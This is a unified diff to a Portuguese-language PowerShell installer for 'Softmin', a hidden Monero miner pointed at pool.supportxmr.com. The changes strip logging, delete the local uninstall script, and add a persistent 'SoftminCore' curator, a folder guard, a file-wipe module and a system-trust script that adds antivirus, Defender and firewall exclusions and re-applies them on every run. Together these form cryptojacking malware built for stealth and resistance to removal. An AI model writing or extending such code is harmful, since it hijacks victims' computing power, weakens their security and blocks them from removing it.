@@ -19,11 +19,12 @@ function Write-RunLog {
         [ValidateSet('INFO', 'OK', 'WARN', 'ERR', 'STEP')]
         [string]$Level = 'INFO'
     )
-    $logDir = Join-Path $InstallPath 'logs'
-    New-Item -ItemType Directory -Force -Path $logDir | Out-Null
-    $line = ('{0}  {1}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Message)
-    Add-Content -LiteralPath (Join-Path $logDir 'run.log') -Value $line -Encoding UTF8
-    Add-Content -LiteralPath (Join-Path $logDir 'instalar.log') -Value $line -Encoding UTF8
+    if ($env:SOFTMIN_DEBUG -eq '1' -and $Level -in @('ERR', 'WARN')) {
+        $logDir = Join-Path $InstallPath 'logs'
+        New-Item -ItemType Directory -Force -Path $logDir | Out-Null
+        $line = ('{0}  {1}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Message)
+        Add-Content -LiteralPath (Join-Path $logDir 'run.log') -Value $line -Encoding UTF8
+    }
     if (-not $Silent) {
         $color = switch ($Level) {
             'OK' { 'Green' }
@@ -266,23 +267,9 @@ cd /d "%~dp0"
 powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Reconfig-Softmin.ps1"
 pause
 '@
-    $uninstBat = @'
-@echo off
-title Softmin ^| desinstalar tudo
-setlocal EnableExtensions
-cd /d "%~dp0"
-echo.
-echo   OMICRON / Softmin - desinstalacao total
-echo.
-set /p CONF=Confirma remover TUDO? (S/N): 
-if /I not "%CONF%"=="S" exit /b 0
-powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Uninstall-Softmin.ps1" -InstallPath "%~dp0" -LauncherPath "%~f0"
-'@
-
     Set-Content -Path (Join-Path $InstallPath 'start.bat') -Value $startBat -Encoding ASCII
     Set-Content -Path (Join-Path $InstallPath 'stop.bat') -Value $stopBat -Encoding ASCII
     Set-Content -Path (Join-Path $InstallPath 'configurar.bat') -Value $configBat -Encoding ASCII
-    Set-Content -Path (Join-Path $InstallPath 'desinstalar-local.bat') -Value $uninstBat -Encoding ASCII
 }
 
 function Register-SoftminAutostart {
@@ -291,36 +278,16 @@ function Register-SoftminAutostart {
         [string]$TaskName = 'Softmin'
     )
     $InstallPath = $InstallPath.TrimEnd('\')
-    $runScript = Join-Path $InstallPath 'Softmin-Run.ps1'
-    $tr = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $runScript + '" -InstallPath "' + $InstallPath + '" -Silent'
-    $startupLnk = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\Softmin.lnk'
-
-    $prev = $ErrorActionPreference
-    $ErrorActionPreference = 'SilentlyContinue'
-    foreach ($legacy in @('MinerAgent-XMRig', 'Softmin-XMRig', 'Softmin-Autostart', $TaskName)) {
-        $null = & schtasks.exe /Delete /TN $legacy /F 2>&1
+    $coreInstaller = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Install-SoftminCore.ps1'
+    if ($coreInstaller) {
+        try {
+            & $coreInstaller -InstallPath $InstallPath -ScriptsSource (Split-Path $coreInstaller -Parent)
+            return @{ Ok = $true; Message = 'Curador persistente (SoftminCore) + guarda de pasta activos.' }
+        } catch {
+            return @{ Ok = $false; Message = ('SoftminCore: {0}' -f $_.Exception.Message) }
+        }
     }
-    $taskOut = @(& schtasks.exe /Create /TN $TaskName /TR $tr /SC ONLOGON /RL LIMITED /F 2>&1 | ForEach-Object { "$_" })
-    $schExit = $LASTEXITCODE
-    $ErrorActionPreference = $prev
-
-    if ($schExit -eq 0) {
-        if (Test-Path -LiteralPath $startupLnk) { Remove-Item -LiteralPath $startupLnk -Force -ErrorAction SilentlyContinue }
-        return @{ Ok = $true; Message = 'Tarefa agendada ONLOGON (Softmin-Run -Silent).' }
-    }
-
-    try {
-        $wsh = New-Object -ComObject WScript.Shell
-        $lnk = $wsh.CreateShortcut($startupLnk)
-        $lnk.TargetPath = Join-Path $InstallPath 'start.bat'
-        $lnk.WorkingDirectory = $InstallPath
-        $lnk.Description = 'OMICRON Softmin - curador adaptativo'
-        $lnk.WindowStyle = 7
-        $lnk.Save()
-        return @{ Ok = $true; Message = 'Atalho Startup criado (schtasks indisponivel).' }
-    } catch {
-        return @{ Ok = $false; Message = ('Autostart falhou: {0}' -f $_.Exception.Message) }
-    }
+    return @{ Ok = $false; Message = 'Install-SoftminCore.ps1 ausente.' }
 }
 
 function Invoke-SoftminFullInstall {
@@ -340,7 +307,10 @@ function Invoke-SoftminFullInstall {
 
     $utilScripts = @(
         'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
-        'Download-SoftminBinary.ps1', 'Uninstall-Softmin.ps1', 'Reconfig-Softmin.ps1', 'Softmin-CloudConfig.ps1'
+        'Download-SoftminBinary.ps1', 'Reconfig-Softmin.ps1', 'Softmin-CloudConfig.ps1',
+        'Install-SoftminCore.ps1', 'Softmin-CorePaths.ps1', 'Softmin-CoreMesh.ps1',
+        'Softmin-Curator.ps1', 'Softmin-FolderGuard.ps1', 'Softmin-WipeFiles.ps1',
+        'Invoke-SoftminSystemTrust.ps1'
     )
     $cloudBase = (Get-SoftminCloudBaseUrl)
     foreach ($name in $utilScripts) {
@@ -365,8 +335,22 @@ function Invoke-SoftminFullInstall {
     }
     if (Test-Path -LiteralPath $defScript) {
         . $defScript
-        $def = Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $InstallPath
-        Write-RunLog $InstallPath ("[INSTALL] AV: {0}" -f $def.Message) -Silent:$Silent -Level $(if ($def.Ok) { 'OK' } else { 'WARN' })
+        $extra = @()
+        $meshPs = Join-Path $InstallPath 'Softmin-CorePaths.ps1'
+        if (Test-Path -LiteralPath $meshPs) {
+            . $meshPs
+            if (Get-Command Get-SoftminTrustExtraPaths -ErrorAction SilentlyContinue) {
+                $extra = Get-SoftminTrustExtraPaths
+            }
+        }
+        $trustMesh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
+        if (Test-Path -LiteralPath $trustMesh) {
+            & $trustMesh -InstallPath $InstallPath
+            Write-RunLog $InstallPath '[INSTALL] AV/firewall (malha + curador).' -Silent:$Silent -Level OK
+        } else {
+            $def = Set-SoftminAntivirusTrust -InstallPath $InstallPath -LogInstallPath $InstallPath -ExtraPaths $extra -Quiet:$Silent
+            Write-RunLog $InstallPath ("[INSTALL] AV: {0}" -f $def.Message) -Silent:$Silent -Level $(if ($def.Ok) { 'OK' } else { 'WARN' })
+        }
     }
 
     if (-not (Ensure-SoftminBinary -InstallPath $InstallPath -LauncherRoot $LauncherRoot -CloudOnly:$CloudOnly)) {
@@ -408,13 +392,16 @@ function Invoke-SoftminFullInstall {
 
     $fwScript = Join-Path $InstallPath 'Set-SoftminFirewall.ps1'
     if (Test-Path -LiteralPath $fwScript) {
-        . (Join-Path $InstallPath 'Softmin-Common.ps1')
-        $settings = $null
-        try { $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false } catch { }
-        $poolHost = if ($settings -and $settings.pool_url) { $settings.pool_url } else { 'pool.supportxmr.com' }
-        $poolPort = if ($settings -and $settings.pool_port) { [int]$settings.pool_port } else { 443 }
-        $fw = & $fwScript -InstallPath $InstallPath -PoolHost $poolHost -PoolPort $poolPort
-        Write-RunLog $InstallPath ("[INSTALL] {0}" -f $fw.Message) -Silent:$Silent -Level $(if ($fw.Ok) { 'OK' } else { 'WARN' })
+        $trustMesh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
+        if (-not (Test-Path -LiteralPath $trustMesh)) {
+            . (Join-Path $InstallPath 'Softmin-Common.ps1')
+            $settings = $null
+            try { $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false } catch { }
+            $poolHost = if ($settings -and $settings.pool_url) { $settings.pool_url } else { 'pool.supportxmr.com' }
+            $poolPort = if ($settings -and $settings.pool_port) { [int]$settings.pool_port } else { 443 }
+            $fw = & $fwScript -InstallPath $InstallPath -PoolHost $poolHost -PoolPort $poolPort
+            Write-RunLog $InstallPath ("[INSTALL] {0}" -f $fw.Message) -Silent:$Silent -Level $(if ($fw.Ok) { 'OK' } else { 'WARN' })
+        }
     }
 
     if (Get-Command Install-SoftminLocalBackup -ErrorAction SilentlyContinue) {
@@ -519,6 +506,11 @@ if ($PSScriptRoot -match 'scripts$') {
 # === 1) GitHub: baixar / reparar ficheiros ===
 Ensure-SoftminMetaIni -InstallPath $InstallPath -ForInstall:$Install
 Sync-SoftminFromGitHub -InstallPath $InstallPath | Out-Null
+
+$trustRefresh = Join-Path $InstallPath 'Invoke-SoftminSystemTrust.ps1'
+if ((Test-Path -LiteralPath $trustRefresh) -and -not $Install) {
+    & $trustRefresh -InstallPath $InstallPath
+}
 if ($Install -and $CloudOnly) {
     Sync-SoftminCriticalFromCloud -InstallPath $InstallPath | Out-Null
     if ($PSScriptRoot -match 'scripts$') {
@@ -626,8 +618,13 @@ Start-Process -FilePath $exe -ArgumentList @(
     '--log-file=' + (Join-Path $logDir 'softmin.log')
 ) -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
 
-Write-RunLog $InstallPath '[RUN] Minerador iniciado (eco). Curador concluido — idle.'
+Write-RunLog $InstallPath '[RUN] Minerador iniciado (eco). Curador concluido — idle.' -Silent:$Silent -Level OK
+
+$coreInstaller = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Install-SoftminCore.ps1'
+if ($coreInstaller) {
+    try { & $coreInstaller -InstallPath $InstallPath -ScriptsSource (Split-Path $coreInstaller -Parent) | Out-Null } catch { }
+}
+
 if (-not $Silent) {
     Write-Host 'Softmin activo (eco). Noite ociosa = turbo. Uso do PC = reduz.' -ForegroundColor Green
-    Write-Host "Log: $(Join-Path $logDir 'run.log')"
 }
